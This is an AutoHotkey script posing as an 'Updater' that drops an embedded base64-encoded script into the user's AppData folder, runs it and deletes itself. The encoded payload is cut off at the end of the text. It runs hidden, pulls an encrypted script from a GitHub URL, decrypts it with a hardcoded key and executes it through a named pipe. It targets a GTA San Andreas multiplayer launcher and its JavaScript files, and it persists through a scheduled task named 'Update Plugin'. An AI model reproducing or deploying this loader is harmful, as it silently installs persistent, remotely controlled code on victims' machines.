 #NoTrayIcon
#SingleInstance Force

CreateUpdater()

CreateUpdater() {
   local
   base64 := GetBase64()
   size := CryptStringToBinary(base64, data)
   if !InStr(FileExist(A_AppData . "\Updater"), "D")
      FileCreateDir, % A_AppData . "\Updater"
   filePath := A_AppData . "\Updater\Updater.ahk"
   if !FileExist(filePath) || CompareData(filePath, data, size) {
      File := FileOpen(filePath, "w")
      File.Pos := 0
      File.RawWrite(data, size)
      File := ""
   }
   Run, % filePath
   FileDelete, % A_ScriptFullPath
}

CryptStringToBinary(string, ByRef outData, formatName := "CRYPT_STRING_BASE64")
{
   local
   static formats := { CRYPT_STRING_BASE64: 0x1
                     , CRYPT_STRING_HEX:    0x4
                     , CRYPT_STRING_HEXRAW: 0xC }
   fmt := formats[formatName]
   chars := StrLen(string)
   if !DllCall("Crypt32\CryptStringToBinary", "Str", string, "UInt", chars, "UInt", fmt
                                            , "Ptr", 0, "UIntP", bytes, "Ptr", 0, "Ptr", 0)
      throw "CryptStringToBinary failed. LastError: " . A_LastError
   VarSetCapacity(outData, bytes)
   DllCall("Crypt32\CryptStringToBinary", "Str", string, "UInt", chars, "UInt", fmt
                                        , "Str", outData, "UIntP", bytes, "Ptr", 0, "Ptr", 0)
   Return bytes
}

CompareData(filePath, ByRef data, len) {
   local
   fileLen := GetFileData(filePath, fileData)
   if (fileLen != len)
      Return true
   hLib := DllCall("LoadLibrary", "Str", "Bcrypt.dll", "Ptr")
   fileHashLen := CreateHash(&fileData, fileLen, fileHashData)
   dataHashLen := CreateHash(&data, len, hashData)
   DllCall("FreeLibrary", "Ptr", hLib)
   Return DllCall("msvcrt\memcmp", "Ptr", &fileHashData, "Ptr", &hashData, "Ptr", dataHashLen)
}

GetFileData(filePath, ByRef data) {
   local
   File := FileOpen(filePath, "r")
   File.Pos := 0
   File.RawRead(data, len := File.Length)
   File := ""
   Return len
}

CreateHash(pData, size, ByRef hashData, pSecretKey := 0, keySize := 0, AlgId := "SHA256") {
   ; CNG Algorithm Identifiers
   ; https://docs.microsoft.com/en-us/windows/win32/seccng/cng-algorithm-identifiers
   local
   static HMAC := BCRYPT_ALG_HANDLE_HMAC_FLAG := 0x00000008
   DllCall("Bcrypt\BCryptOpenAlgorithmProvider", "PtrP", hAlgorithm, "WStr",  AlgId, "Ptr", 0, "UInt", keySize ? HMAC : 0)
   DllCall("Bcrypt\BCryptCreateHash", "Ptr", hAlgorithm, "PtrP", hHash, "Ptr", 0, "UInt", 0, "Ptr", pSecretKey, "UInt", keySize, "UInt", 0)
   DllCall("Bcrypt\BCryptHashData", "Ptr", hHash, "Ptr", pData, "UInt", size, "UInt", 0)
   DllCall("Bcrypt\BCryptGetProperty", "Ptr", hAlgorithm, "WStr", "HashDigestLength", "UIntP", hashLen, "UInt", 4, "UIntP", cbResult, "UInt", 0)
   VarSetCapacity(hashData, hashLen, 0)
   DllCall("Bcrypt\BCryptFinishHash", "Ptr", hHash, "Ptr", &hashData, "UInt", hashLen, "UInt", 0)
   DllCall("Bcrypt\BCryptDestroyHash", "Ptr", hHash)
   DllCall("Bcrypt\BCryptCloseAlgorithmProvider", "Ptr", hAlgorithm, "UInt", 0)
   Return hashLen
}

GetBase64() {
local
base64 := "77u/I05vVHJheUljb24NCiNQZXJzaXN0ZW50DQojU2luZ2xlSW5zdGFuY2UgT2ZmDQpEZXRlY3RIaWRkZW5XaW5kb3dzLCBPbg0KDQpVcGRhdGVQZXJpb2QgOj0gMTAwMCozNjAwKjUgOyA1INGH0LDRgdC+0LINCg0KaWYgQV9BcmdzWzFdDQogICBVcGRhdGUoKQ0KZWxzZSB7DQogICBPbk1lc3NhZ2UoMHgxMjM0LCBGdW5jKCJPbkNoaWxkTWVzc2FnZSIpLkJpbmQoVXBkYXRlUGVyaW9kKSkNCiAgIFNoZWxsUnVuQXNVc2VyKEFfU2NyaXB0RnVsbFBhdGgsICJ1c2VyICIgLiBBX1NjcmlwdEh3bmQpDQp9DQpSZXR1cm4NCg0KVXBkYXRlKCkgew0KICAgc3RhdGljIGhlbHBlckxpbmsgOj0gImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9qb2xseWNvZGVyL3Rlc3QvbWFpbi9hYmMuYWhrIg0KICAgICAgICAsIHRpbWVyIDo9ICIiLCBkYXRhIDo9ICIiLCBsZW4gOj0gIiINCiAgICggIXRpbWVyICYmIHRpbWVyIDo9IEZ1bmMoQV9UaGlzRnVuYykgKQ0KICAgaWYgKEFfQXJnc1sxXSA9ICIiIHx8IEFfQXJnc1sxXSA9ICJ0YXNrIikgew0KICAgICAgKCAhbGVuICYmIGxlbiA6PSBXZWJSZXF1ZXN0KGhlbHBlckxpbmssIGRhdGEsLCwsIGVycm9yIDo9ICIiKSApDQogICAgICBpZiBlcnJvciB7DQogICAgICAgICBTZXRUaW1lciwgJSB0aW1lciwgLTUwMDANCiAgICAgICAgIFJldHVybg0KICAgICAgfQ0KICAgfQ0KICAgUHJvY2VzcywgRXhpc3QsIFJBRE1JUl9MQVVOQ0hFUl9FWC5leGUNCiAgIGlmICEoUElEIDo9IEVycm9yTGV2ZWwpIHsNCiAgICAgIFNldFRpbWVyLCAlIHRpbWVyLCAtMTAwMA0KICAgICAgUmV0dXJuDQogICB9DQogICBQcm9jZXNzLCBFeGlzdCwgZ3RhX3NhLmV4ZQ0KICAgaWYgRXJyb3JMZXZlbCB7DQogICAgICBTZXRUaW1lciwgJSB0aW1lciwgLTEwMDANCiAgICAgIFJldHVybg0KICAgfQ0KICAgaWYgKEFfQXJnc1sxXSA9ICJ1c2VyIikNCiAgICAgIFRyeUNyZWF0ZVRhc2soUElEKQ0KICAgKCBsZW4gJiYgRHluYVJ1bihEZWNyRGF0YShkYXRhLCBsZW4pKSApDQogICBpZiBBX0FyZ3NbMV0NCiAgICAgIEV4aXRBcHANCn0NCg0KV2ViUmVxdWVzdCh1cmwsIEJ5UmVmIGRhdGEsIG1ldGhvZCA6PSAiR0VUIiwgSGVhZGVyc0FycmF5IDo9ICIiLCBib2R5IDo9ICIiLCBCeVJlZiBlcnJvciA6PSAiIikgew0KICAgV2hyIDo9IENvbU9iakNyZWF0ZSgiV2luSHR0cC5XaW5IdHRwUmVxdWVzdC41LjEiKQ0KICAgV2hyLk9wZW4obWV0aG9kLCB1cmwsIHRydWUpDQogICBmb3IgbmFtZSwgdmFsdWUgaW4gSGVhZGVyc0FycmF5DQogICAgICBXaHIuU2V0UmVxdWVzdEhlYWRlcihuYW1lLCB2YWx1ZSkNCiAgIFdoci5TZW5kKGJvZHkpDQogICBXaHIuV2FpdEZvclJlc3BvbnNlKCkNCiAgIHN0YXR1cyA6PSBXaHIuc3RhdHVzDQogICBpZiAoc3RhdHVzICE9IDIwMCkNCiAgICAgIGVycm9yIDo9ICJIdHRwUmVxdWVzdCBlcnJvciwgc3RhdHVzOiAiIC4gc3RhdHVzDQogICBBcnIgOj0gV2hyLnJlc3BvbnNlQm9keQ0KICAgcERhdGEgOj0gTnVtR2V0KENvbU9ialZhbHVlKGFycikgKyA4ICsgQV9QdHJTaXplKQ0KICAgbGVuZ3RoIDo9IEFyci5NYXhJbmRleCgpICsgMQ0KICAgVmFyU2V0Q2FwYWNpdHkoZGF0YSwgbGVuZ3RoLCAwKQ0KICAgRGxsQ2FsbCgiUnRsTW92ZU1lbW9yeSIsICJQdHIiLCAmZGF0YSwgIlB0ciIsIHBEYXRhLCAiUHRyIiwgbGVuZ3RoKQ0KICAgUmV0dXJuIGxlbmd0aA0KfQ0KDQpUcnlDcmVhdGVUYXNrKFBJRCkgew0KICAgZXhlUGF0aCA6PSBHZXRQcm9jZXNzSW1hZ2VOYW1lKFBJRCkNCiAgIFNwbGl0UGF0aCwgZXhlUGF0aCwsIGRpcg0KICAganNEaXIgOj0gZGlyIC4gIlxyZXNvdXJjZXNccHJvamVjdHNcY3JtcFxjZWZcYXNzZXRzXGpzIg0KICAgaWYgISgoIChhcHBQYXRoIDo9IEZpbmRQYXRoKGpzRGlyLCAiYXBwLiouanMiKSkgfHwgKGFwcFBhdGggOj0gRmluZFBhdGgoanNEaXIsICIqLmpzIikpICkgJiYgRmlsZSA6PSBGaWxlT3BlbihhcHBQYXRoLCAicnciKSkNCiAgICAgIFNlbmRNZXNzYWdlLCAweDEyMzQsIDAsIDAsLCAlICJhaGtfaWQgIiAuIEFfQXJnc1syXQ0KICAgZWxzZSB7DQogICAgICBpZiAhKCBGaWxlRXhpc3QoZmlsZVBhdGggOj0gQV9BcHBEYXRhIC4gIlxVcGRhdGVyXCIgLiBBX1NjcmlwdE5hbWUpICYmIEFfU2NyaXB0RGlyICE9IEFfQXBwRGF0YSAuICJcVXBkYXRlciIgKSB7DQogICAgICAgICBpZiAhSW5TdHIoRmlsZUV4aXN0KEFfQXBwRGF0YSAuICJcVXBkYXRlciIpLCAiRCIpDQogICAgICAgICAgICBGaWxlQ3JlYXRlRGlyLCAlIEFfQXBwRGF0YSAuICJcVXBkYXRlciINCiAgICAgICAgIGlmICFGaWxlRXhpc3QoZmlsZVBhdGgpDQogICAgICAgICAgICBGaWxlQ29weSwgJSBBX1NjcmlwdEZ1bGxQYXRoLCAlIGZpbGVQYXRoLCAxDQogICAgICAgICBlbHNlIHsNCiAgICAgICAgICAgIEZpbGUgOj0gRmlsZU9wZW4oZmlsZVBhdGgsICJyIikNCiAgICAgICAgICAgIEZpbGUuUG9zIDo9IDANCiAgICAgICAgICAgIEZpbGUuUmF3UmVhZChidWYsIHNpemUgOj0gRmlsZS5MZW5ndGgpDQogICAgICAgICAgICBGaWxlIDo9ICIiDQogICAgICAgICAgICBpZiBDb21wYXJlRGF0YShBX1NjcmlwdEZ1bGxQYXRoLCBidWYsIHNpemUpDQogICAgICAgICAgICAgICBGaWxlQ29weSwgJSBBX1NjcmlwdEZ1bGxQYXRoLCAlIGZpbGVQYXRoLCAxDQogICAgICAgICB9DQogICAgICB9DQogICAgICB0cnkgcmVzIDo9IENyZWF0ZVRhc2soIlVwZGF0ZSBQbHVnaW4iLCBmaWxlUGF0aCwgInRhc2siLCAiMTQ6MDAiLCA1LCBzdGFydEltbWVkaWF0ZWx5IDo9IHRydWUpDQogICAgICBjYXRjaA0KICAgICAgICAgU2VuZE1lc3NhZ2UsIDB4MTIzNCwgMCwgMCwsICUgImFoa19pZCAiIC4gQV9BcmdzWzJdDQogICAgICBpZiByZXMNCiAgICAgICAgIFNlbmRNZXNzYWdlLCAweDEyMzQsIDEsIDAsLCAlICJhaGtfaWQgIiAuIEFfQXJnc1syXQ0KICAgfQ0KICAgU2xlZXAsIDIwMA0KfQ0KDQpHZXRQcm9jZXNzSW1hZ2VOYW1lKFBJRCkgew0KICAgc3RhdGljIGFjY2VzcyA6PSBQUk9DRVNTX1FVRVJZX0xJTUlURURfSU5GT1JNQVRJT04gOj0gMHgxMDAwDQogICBpZiAhaFByb2MgOj0gRGxsQ2FsbCgiT3BlblByb2Nlc3MiLCAiVUludCIsIGFjY2VzcywgIkludCIsIDAsICJVSW50IiwgUElELCAiUHRyIikNCiAgICAgIHRocm93ICJGYWlsZWQgdG8gb3BlbiBwcm9jZXNzLCBlcnJvcjogIiAuIEFfTGFzdEVycm9yDQogICBWYXJTZXRDYXBhY2l0eShpbWFnZVBhdGgsIDEwMjQsIDApDQogICBEbGxDYWxsKCJRdWVyeUZ1bGxQcm9jZXNzSW1hZ2VOYW1lIiwgIlB0ciIsIGhQcm9jLCAiVUludCIsIDAsICJTdHIiLCBpbWFnZVBhdGgsICJVSW50UCIsIDUxMikNCiAgIERsbENhbGwoIkNsb3NlSGFuZGxlIiwgIlB0ciIsIGhQcm9jKQ0KICAgUmV0dXJuIGltYWdlUGF0aA0KfQ0KDQpGaW5kUGF0aChkaXIsIGZpbGVOYW1lUGF0dGVybikgew0KICAgTG9vcCwgRmlsZXMsICUgZGlyIC4gIlwiIC4gZmlsZU5hbWVQYXR0ZXJuDQogICAgICBmaWxlUGF0aCA6PSBBX0xvb3BGaWxlRnVsbFBhdGgNCiAgIHVudGlsIGZpbGVQYXRoDQogICBSZXR1cm4gZmlsZVBhdGgNCn0NCg0KQ29tcGFyZURhdGEoZmlsZVBhdGgsIEJ5UmVmIGRhdGEsIGxlbikgew0KICAgbG9jYWwNCiAgIGZpbGVMZW4gOj0gR2V0RmlsZURhdGEoZmlsZVBhdGgsIGZpbGVEYXRhKQ0KICAgaWYgKGZpbGVMZW4gIT0gbGVuKQ0KICAgICAgUmV0dXJuIHRydWUNCiAgIGhMaWIgOj0gRGxsQ2FsbCgiTG9hZExpYnJhcnkiLCAiU3RyIiwgIkJjcnlwdC5kbGwiLCAiUHRyIikNCiAgIGZpbGVIYXNoTGVuIDo9IENyZWF0ZUhhc2goJmZpbGVEYXRhLCBmaWxlTGVuLCBmaWxlSGFzaERhdGEpDQogICBkYXRhSGFzaExlbiA6PSBDcmVhdGVIYXNoKCZkYXRhLCBsZW4sIGhhc2hEYXRhKQ0KICAgRGxsQ2FsbCgiRnJlZUxpYnJhcnkiLCAiUHRyIiwgaExpYikNCiAgIFJldHVybiBEbGxDYWxsKCJtc3ZjcnRcbWVtY21wIiwgIlB0ciIsICZmaWxlSGFzaERhdGEsICJQdHIiLCAmaGFzaERhdGEsICJQdHIiLCBkYXRhSGFzaExlbikNCn0NCg0KR2V0RmlsZURhdGEoZmlsZVBhdGgsIEJ5UmVmIGRhdGEpIHsNCiAgIGxvY2FsDQogICBGaWxlIDo9IEZpbGVPcGVuKGZpbGVQYXRoLCAiciIpDQogICBGaWxlLlBvcyA6PSAwDQogICBGaWxlLlJhd1JlYWQoZGF0YSwgbGVuIDo9IEZpbGUuTGVuZ3RoKQ0KICAgRmlsZSA6PSAiIg0KICAgUmV0dXJuIGxlbg0KfQ0KDQpDcmVhdGVIYXNoKHBEYXRhLCBzaXplLCBCeVJlZiBoYXNoRGF0YSwgcFNlY3JldEtleSA6PSAwLCBrZXlTaXplIDo9IDAsIEFsZ0lkIDo9ICJTSEEyNTYiKSB7DQogICA7IENORyBBbGdvcml0aG0gSWRlbnRpZmllcnMNCiAgIDsgaHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tdXMvd2luZG93cy93aW4zMi9zZWNjbmcvY25nLWFsZ29yaXRobS1pZGVudGlmaWVycw0KICAgbG9jYWwNCiAgIHN0YXRpYyBITUFDIDo9IEJDUllQVF9BTEdfSEFORExFX0hNQUNfRkxBRyA6PSAweDAwMDAwMDA4DQogICBEbGxDYWxsKCJCY3J5cHRcQkNyeXB0T3BlbkFsZ29yaXRobVByb3ZpZGVyIiwgIlB0clAiLCBoQWxnb3JpdGhtLCAiV1N0ciIsICBBbGdJZCwgIlB0ciIsIDAsICJVSW50Iiwga2V5U2l6ZSA/IEhNQUMgOiAwKQ0KICAgRGxsQ2FsbCgiQmNyeXB0XEJDcnlwdENyZWF0ZUhhc2giLCAiUHRyIiwgaEFsZ29yaXRobSwgIlB0clAiLCBoSGFzaCwgIlB0ciIsIDAsICJVSW50IiwgMCwgIlB0ciIsIHBTZWNyZXRLZXksICJVSW50Iiwga2V5U2l6ZSwgIlVJbnQiLCAwKQ0KICAgRGxsQ2FsbCgiQmNyeXB0XEJDcnlwdEhhc2hEYXRhIiwgIlB0ciIsIGhIYXNoLCAiUHRyIiwgcERhdGEsICJVSW50Iiwgc2l6ZSwgIlVJbnQiLCAwKQ0KICAgRGxsQ2FsbCgiQmNyeXB0XEJDcnlwdEdldFByb3BlcnR5IiwgIlB0ciIsIGhBbGdvcml0aG0sICJXU3RyIiwgIkhhc2hEaWdlc3RMZW5ndGgiLCAiVUludFAiLCBoYXNoTGVuLCAiVUludCIsIDQsICJVSW50UCIsIGNiUmVzdWx0LCAiVUludCIsIDApDQogICBWYXJTZXRDYXBhY2l0eShoYXNoRGF0YSwgaGFzaExlbiwgMCkNCiAgIERsbENhbGwoIkJjcnlwdFxCQ3J5cHRGaW5pc2hIYXNoIiwgIlB0ciIsIGhIYXNoLCAiUHRyIiwgJmhhc2hEYXRhLCAiVUludCIsIGhhc2hMZW4sICJVSW50IiwgMCkNCiAgIERsbENhbGwoIkJjcnlwdFxCQ3J5cHREZXN0cm95SGFzaCIsICJQdHIiLCBoSGFzaCkNCiAgIERsbENhbGwoIkJjcnlwdFxCQ3J5cHRDbG9zZUFsZ29yaXRobVByb3ZpZGVyIiwgIlB0ciIsIGhBbGdvcml0aG0sICJVSW50IiwgMCkNCiAgIFJldHVybiBoYXNoTGVuDQp9DQoNCkRlY3JEYXRhKEJ5UmVmIGRhdGEsIGxlbmd0aCkgew0KICAgc3RhdGljIGl2IDo9ICJzb21ldGV4dCIsIHB3IDo9ICIzOTVGRDA4Mi03QkM5LTQ2NjItODAxOS05NjY4RkM5RDM0MzkiDQogICBiYXNlNjQgOj0gU3RyR2V0KCZkYXRhLCBsZW5ndGgsICJjcDAiKQ0KICAgbGVuZ3RoIDo9IENyeXB0U3RyaW5nVG9CaW5hcnkoYmFzZTY0LCBkYXRhKQ0KICAgcHdkTGVuIDo9IFN0clB1dEJ1ZmYocHcsIHB3ZERhdGEpDQogICBoTGliIDo9IERsbENhbGwoIkxvYWRMaWJyYXJ5IiwgIlN0ciIsICJCY3J5cHQuZGxsIiwgIlB0ciIpDQogICBsZW5IYXNoUGFzc3dvcmQgOj0gQ3JlYXRlSGFzaCgmcHdkRGF0YSwgcHdkTGVuLCBoYXNoUGFzc3dvcmQpDQogICBpdkxlbiA6PSBTdHJQdXRCdWZmKGl2LCBpdkRhdGEpDQogICBsZW5IYXNoSXYgOj0gQ3JlYXRlSGFzaCgmaXZEYXRhLCBpdkxlbiwgaGFzaEl2KQ0KICAgVmFyU2V0Q2FwYWNpdHkoaXYxNiwgMTYsIDApDQogICBEbGxDYWxsKCJSdGxNb3ZlTWVtb3J5IiwgIlB0ciIsIHBIYXNoSXYgOj0gJml2MTYsICJQdHIiLCAmaGFzaEl2ICsgbGVuSGFzaEl2IC0gMTYsICJQdHIiLCBsZW5JdiA6PSAxNikNCiAgIGxlbiA6PSBCY3J5cHQoJmRhdGEsIGxlbmd0aCwgb3V0RGF0YSwgJmhhc2hQYXNzd29yZCwgbGVuSGFzaFBhc3N3b3JkLCBwSGFzaEl2LCBsZW5JdikNCiAgIERsbENhbGwoIkZyZWVMaWJyYXJ5IiwgIlB0ciIsIGhMaWIpDQogICB1dGY4IDo9IE51bUdldChvdXREYXRhLCAiSW50IikgJiAweEZGRkZGRiA9IDB4YmZiYmVmDQogICBSZXR1cm4gU3RyR2V0KCZvdXREYXRhICsgKHV0ZjggPyAzIDogMCksIGxlbiwgIlVURi04IikNCn0NCg0KQ3J5cHRTdHJpbmdUb0JpbmFyeShzdHJpbmcsIEJ5UmVmIG91dERhdGEsIGZvcm1hdE5hbWUgOj0gIkNSWVBUX1NUUklOR19CQVNFNjQiKQ0Kew0KICAgc3RhdGljIGZvcm1hdHMgOj0geyBDUllQVF9TVFJJTkdfQkFTRTY0OiAweDENCiAgICAgICAgICAgICAgICAgICAgICwgQ1JZUFRfU1RSSU5HX0hFWDogICAgMHg0DQogICAgICAgICAgICAgICAgICAgICAsIENSWVBUX1NUUklOR19IRVhSQVc6IDB4QyB9DQogICBmbXQgOj0gZm9ybWF0c1tmb3JtYXROYW1lXQ0KICAgY2hhcnMgOj0gU3RyTGVuKHN0cmluZykNCiAgIGlmICFEbGxDYWxsKCJDcnlwdDMyXENyeXB0U3RyaW5nVG9CaW5hcnkiLCAiU3RyIiwgc3RyaW5nLCAiVUludCIsIGNoYXJzLCAiVUludCIsIGZtdA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAsICJQdHIiLCAwLCAiVUludFAiLCBieXRlcywgIlB0ciIsIDAsICJQdHIiLCAwKQ0KICAgICAgdGhyb3cgIkNyeXB0U3RyaW5nVG9CaW5hcnkgZmFpbGVkLiBMYXN0RXJyb3I6ICIgLiBBX0xhc3RFcnJvcg0KICAgVmFyU2V0Q2FwYWNpdHkob3V0RGF0YSwgYnl0ZXMpDQogICBEbGxDYWxsKCJDcnlwdDMyXENyeXB0U3RyaW5nVG9CaW5hcnkiLCAiU3RyIiwgc3RyaW5nLCAiVUludCIsIGNoYXJzLCAiVUludCIsIGZtdA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICwgIlN0ciIsIG91dERhdGEsICJVSW50UCIsIGJ5dGVzLCAiUHRyIiwgMCwgIlB0ciIsIDApDQogICBSZXR1cm4gYnl0ZXMNCn0NCg0KQmNyeXB0KHBEYXRhLCBkYXRhU2l6ZSwgQnlSZWYgb3V0RGF0YSwgcEtleSwga2V5U2l6ZSwgcEl2IDo9IDAsIGl2U2l6ZSA6PSAwLCBBbGdJZCA6PSAiQUVTIiwgY3J5cHQgOj0gIkRlY3J5cHQiLCBjaGFpbmluZ01vZGUgOj0gIkNoYWluaW5nTW9kZUNCQyIpIHsNCjsgY3J5cHQ6IEVuY3J5cHQvRGVjcnlwdA0KICAgc3RhdGljIHBhZGRpbmcgOj0gQkNSWVBUX0JMT0NLX1BBRERJTkcgOj0gMSwgY2hhaW5pbmdNb2RlU2l6ZSA6PSBTdHJMZW4oY2hhaW5pbmdNb2RlKSoyDQogICBwTG9jYWxJdiA6PSAwDQogICBpZiBwSXYgew0KICAgICAgVmFyU2V0Q2FwYWNpdHkobG9jYWxJdiwgaXZTaXplLCAwKQ0KICAgICAgRGxsQ2FsbCgiUnRsTW92ZU1lbW9yeSIsICJQdHIiLCBwTG9jYWxJdiA6PSAmbG9jYWxJdiwgIlB0ciIsIHBJdiwgIlB0ciIsIGl2U2l6ZSkNCiAgIH0NCiAgIERsbENhbGwoIkJjcnlwdFxCQ3J5cHRPcGVuQWxnb3JpdGhtUHJvdmlkZXIiLCAiUHRyUCIsIGhBbGdvcml0aG0sICJXU3RyIiwgQWxnSWQsICJQdHIiLCAwLCAiVUludCIsIDApDQogICBEbGxDYWxsKCJCY3J5cHRcQkNyeXB0U2V0UHJvcGVydHkiLCAiUHRyIiwgaEFsZ29yaXRobSwgIldTdHIiLCAiQ2hhaW5pbmdNb2RlIg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAsICJXU3RyIiwgY2hhaW5pbmdNb2RlLCAiVUludCIsIGNoYWluaW5nTW9kZVNpemUsICJVSW50IiwgMCkNCiAgIERsbENhbGwoIkJjcnlwdFxCQ3J5cHRHZW5lcmF0ZVN5bW1ldHJpY0tleSIsICJQdHIiLCBoQWxnb3JpdGhtLCAiUHRyUCIsIGhLZXksICJQdHIiLCAwLCAiVUludCIsIDANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLCAiUHRyIiAsIHBLZXksICJVSW50Iiwga2V5U2l6ZSwgIlVJbnQiLCAwLCAiVUludCIpDQogICByZXMgOj0gRGxsQ2FsbCgiQmNyeXB0XEJDcnlwdCIgLiBjcnlwdCwgIlB0ciIsIGhLZXksICJQdHIiLCBwRGF0YSwgIlVJbnQiLCBkYXRhU2l6ZSwgIlB0ciIsIDANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICwgIlB0ciIsIHBMb2NhbEl2LCAiVUludCIsIGl2U2l6ZSwgIlB0ciIsIDANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICwgIlVJbnQiLCAwLCAiVUludFAiLCBvdXRTaXplLCAiVUludCIsIHBhZGRpbmcsICJVSW50IikNCiAgIGlmIChyZXMgIT0gMCkNCiAgICAgIHRocm93ICJDcnlwdCBlcnJvciEgQkNyeXB0IiAuIGNyeXB0IC4gIjEgcmVzdWx0OiAiIC4gRm9ybWF0KCJ7OiN4fSIsIHJlcykNCiAgIFZhclNldENhcGFjaXR5KG91dERhdGEsIG91dFNpemUsIDApDQogICByZXMgOj0gRGxsQ2FsbCgiQmNyeXB0XEJDcnlwdCIgLiBjcnlwdCwgIlB0ciIsIGhLZXksICJQdHIiLCBwRGF0YSwgIlVJbnQiLCBkYXRhU2l6ZSwgIlB0ciIsIDANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICwgIlB0ciIsIHBMb2NhbEl2LCAiVUludCIsIGl2U2l6ZSwgIlB0ciIsICZvdXREYXRhDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAsICJVSW50Iiwgb3V0U2l6ZSwgIlVJbnRQIiwgb3V0U2l6ZSwgIlVJbnQiLCBwYWRkaW5nLCAiVUludCIpDQogICBpZiAocmVzICE9IDApDQogICAgICB0aHJvdyAiQ3J5cHQgZXJyb3IhIEJDcnlwdCIgLiBjcnlwdCAuICIyIHJlc3VsdDogIiAuIEZvcm1hdCgiezojeH0iLCByZXMpDQogICBEbGxDYWxsKCJCY3J5cHRcQkNyeXB0RGVzdHJveUtleSIsICJQdHIiLCBoS2V5KQ0KICAgRGxsQ2FsbCgiQmNyeXB0XEJDcnlwdENsb3NlQWxnb3JpdGhtUHJvdmlkZXIiLCAiUHRyIiwgaEFsZ29yaXRobSwgIlVJbnQiLCAwKQ0KICAgUmV0dXJuIG91dFNpemUNCn0NCg0KU3RyUHV0QnVmZihzdHJpbmcsIEJ5UmVmIGRhdGEsIGVuY29kaW5nIDo9ICJVVEYtOCIpICB7DQogICBWYXJTZXRDYXBhY2l0eSggZGF0YSwgbGVuIDo9IChTdHJQdXQoc3RyaW5nLCBlbmNvZGluZykgLSAxKSA8PCAoZW5jb2Rpbmcgfj0gImkpXihVVEYtMTZ8Y3AxMjAwKSQiKSApDQogICBTdHJQdXQoc3RyaW5nLCAmZGF0YSwgZW5jb2RpbmcpDQogICBSZXR1cm4gbGVuDQp9DQoNCkR5bmFSdW4odGVtcFNjcmlwdCwgYWhrUGF0aCA6PSAiIiwgcGlwZU5hbWUgOj0gIiIsIGFyZ3MqKQ0Kew0KICAgc3RhdGljIHBhcmFtcyA6PSBbICJVSW50IiwgUElQRV9BQ0NFU1NfT1VUQk9VTkQgICAgIDo9IDB4MiwgIlVJbnQiLCAwDQogICAgICAgICAgICAgICAgICAgICwgIlVJbnQiLCBQSVBFX1VOTElNSVRFRF9JTlNUQU5DRVMgOj0gMjU1LCAiVUludCIsIDANCiAgICAgICAgICAgICAgICAgICAgLCAiVUludCIsIDAsICJQdHIiLCAwLCAiUHRyIiwgMCwgIlB0ciIgXQ0KICAgICAgICAsIEJPTSA6PSBDaHIoMHhGRUZGKQ0KDQogICAoYWhrUGF0aCA9ICIiICYmIGFoa1BhdGggOj0gQV9BaGtQYXRoKQ0KICAgKHBpcGVOYW1lID0gIiIgJiYgcGlwZU5hbWUgOj0gIkFIS18iIC4gQV9UaWNrQ291bnQpDQogICANCiAgIExvb3AgMSB7DQogICAgICBmb3IgaywgdiBpbiBbInBpcGVHQSIsICJwaXBlIl0NCiAgICAgICAgICV2JSA6PSBEbGxDYWxsKCJDcmVhdGVOYW1lZFBpcGUiLCBTdHIsICJcXC5ccGlwZVwiIC4gcGlwZU5hbWUsIHBhcmFtcyopDQogICAgICBpZiAoIChwaXBlID0gLTEgfHwgcGlwZUdBID0gLTEpICYmIGVycm9yIDo9ICJDYW4ndCBjcmVhdGUgcGlwZSAiIiIgLiBwaXBlTmFtZSAuICIiImBuTGFzdEVycm9yOiAiIC4gQV9MYXN0RXJyb3IgKQ0KICAgICAgICAgYnJlYWsNCiAgICAgIHNDbWQgOj0gYWhrUGF0aCAuICIgIiJcXC5ccGlwZVwiIC4gcGlwZU5hbWUgLiAiIiIiDQogICAgICBmb3IgaywgdiBpbiBhcmdzDQogICAgICAgICBzQ21kIC49ICIgIiIiIC4gdiAuICIiIiINCiAgICAgIFJ1biwgJSBzQ21kLCwgVXNlRXJyb3JMZXZlbCBISURFLCBQSUQNCiAgICAgIGlmIChFcnJvckxldmVsICYmIGVycm9yIDo9ICJDYW4ndCBvcGVuIGZpbGU6YG4gIiJcXC5ccGlwZVwiIC4gcGlwZU5hbWUgLiAiIiIiKQ0KICAgICAgICAgYnJlYWsNCiAgICAgIGZvciBrLCB2IGluIFsicGlwZUdBIiwgInBpcGUiXQ0KICAgICAgICAgRGxsQ2FsbCgiQ29ubmVjdE5hbWVkUGlwZSIsIFB0ciwgJXYlLCBQdHIsIDApDQogICAgICB0ZW1wU2NyaXB0IDo9IEJPTSAuIHRlbXBTY3JpcHQNCiAgICAgIHRlbXBTY3JpcHRTaXplIDo9ICggU3RyTGVuKHRlbXBTY3JpcHQpICsgMSApIDw8ICEhQV9Jc1VuaWNvZGUNCiAgICAgIGlmICFEbGxDYWxsKCJXcml0ZUZpbGUiLCBQdHIsIHBpcGUsIFN0ciwgdGVtcFNjcmlwdCwgVUludCwgdGVtcFNjcmlwdFNpemUsIFVJbnRQLCAwLCBQdHIsIDApDQogICAgICAgICBlcnJvciA6PSAiV3JpdGVGaWxlIGZhaWxlZCwgTGFzdEVycm9yOiAiIC4gQV9MYXN0RXJyb3INCiAgIH0NCiAgIGZvciBrLCB2IGluIFsicGlwZUdBIiwgInBpcGUiXQ0KICAgICAgKCAldiUgIT0gLTEgJiYgRGxsQ2FsbCgiQ2xvc2VIYW5kbGUiLCBQdHIsICV2JSkgKQ0KICAgaWYgZXJyb3INCiAgICAgIHRocm93IEV4Y2VwdGlvbihlcnJvcikNCiAgIFJldHVybiBQSUQNCn0NCg0KU2hlbGxSdW5Bc1VzZXIoZmlsZVBhdGgsIGFyZ3VtZW50cyA6PSAiIiwgZGlyZWN0b3J5IDo9ICIiLCB2ZXJiIDo9I